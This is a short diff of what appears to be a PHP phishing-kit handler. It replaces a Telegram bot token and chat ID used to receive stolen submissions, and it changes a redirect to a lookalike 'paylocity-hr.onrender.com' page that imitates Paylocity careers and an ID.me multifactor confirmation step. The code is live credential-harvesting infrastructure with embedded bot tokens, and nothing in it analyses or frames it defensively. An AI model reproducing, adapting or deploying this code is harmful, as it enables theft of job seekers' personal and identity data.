@@ -14,8 +14,8 @@
             'chat_id' => '1325797388'
         ],
         [
-            'token' => '7395338291:AAFiyILeZdxyENeRvcaYgZ93vnv2DYyW_XM',
-            'chat_id' => '8160582785'
+            'token' => '5127408894:AAFL6Sp0NxLZOtbMavh2jzisNqyj5rh0QPM',
+            'chat_id' => '1288379314'
         ]
         // Add more bots here if needed
     ];
@@ -89,7 +89,7 @@ sendMessageToTelegramBots($telegram_message, $telegram_bots);
 
 
 
-header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
+header("Location:https://paylocity-hr.onrender.com/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
 exit;
 }
 ?>
